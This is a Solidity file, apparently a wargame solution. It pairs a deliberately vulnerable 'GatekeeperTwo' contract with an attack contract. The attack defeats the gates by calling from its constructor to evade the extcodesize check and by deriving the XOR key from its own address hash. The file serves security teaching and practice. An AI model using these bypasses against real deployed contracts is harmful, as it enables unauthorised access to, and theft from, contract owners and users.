// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
// pragma experimental abiencoderv2

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
// key format = 0xOOOOOOOO
contract BreakGateKeeperTwo {
    GatekeeperTwo gate;
    
    constructor(address _gate) public {
        gate = GatekeeperTwo(_gate);
        uint64 key = maxUint64() ^ getUint64(address(this));
        gate.enter(bytes8(uint64(key)));
    }

    function getUint64(address addr) public pure returns(uint64) {
        return uint64(bytes8(keccak256(abi.encodePacked(addr))));
    }

    function maxUint64() public pure returns(uint64) {
        return uint64(0) - 1;
    }

}